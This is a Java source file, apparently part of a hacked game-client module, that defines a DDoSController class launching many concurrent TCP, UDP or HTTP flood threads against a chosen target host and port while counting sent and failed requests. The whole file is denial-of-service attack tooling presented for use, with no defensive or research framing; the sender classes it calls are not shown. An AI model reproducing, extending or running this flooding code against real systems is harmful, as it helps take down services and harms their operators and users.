package com.lawab1ders.nan7i.kali.module.impl.other.ddos;

/*
 * Copyright (c) 2025 EldoDebug, Nan7i.南起
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
 * documentation files (the "Software"), to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
 * to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or substantial portions of
 * the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
 * THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
 * CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */

import com.lawab1ders.nan7i.kali.module.impl.other.ddos.senders.HTTPSender;
import com.lawab1ders.nan7i.kali.module.impl.other.ddos.senders.TCPSender;
import com.lawab1ders.nan7i.kali.module.impl.other.ddos.senders.UDPSender;
import com.lawab1ders.nan7i.kali.utils.Multithreading;

public final class DDoSController {

    public volatile static boolean isAttacking;
    public static long attackStartTime;

    public static int attackCount, failedCount;

    private static final Multithreading multithreading = new Multithreading();

    public static void stopAttack() {
        isAttacking = false;

        if (!multithreading.isTerminated()) multithreading.shutdown();
    }

    public static void startAttack(String target, int port, int attackType, int threadCount, int timeout,
                                   String requestData) {
        isAttacking = true;
        attackStartTime = System.currentTimeMillis();
        attackCount = failedCount = 0;

        switch (attackType) {
            case 0:
                TCPSender[] threadsTCP = new TCPSender[threadCount];

                for (int i = 0; i < threadCount; i++) {
                    threadsTCP[i] = new TCPSender(target, port, timeout, requestData);
                    multithreading.runAsync(threadsTCP[i]);
                }

                break;
            case 1:
                UDPSender[] threadsUDP = new UDPSender[threadCount];

                for (int i = 0; i < threadCount; i++) {
                    threadsUDP[i] = new UDPSender(target, port, requestData);
                    multithreading.runAsync(threadsUDP[i]);
                }

                break;
            case 2:
                HTTPSender[] threadsHTTP = new HTTPSender[threadCount];

                for (int i = 0; i < threadCount; i++) {
                    threadsHTTP[i] = new HTTPSender(target, timeout);
                    multithreading.runAsync(threadsHTTP[i]);
                }

                break;
        }
    }
}
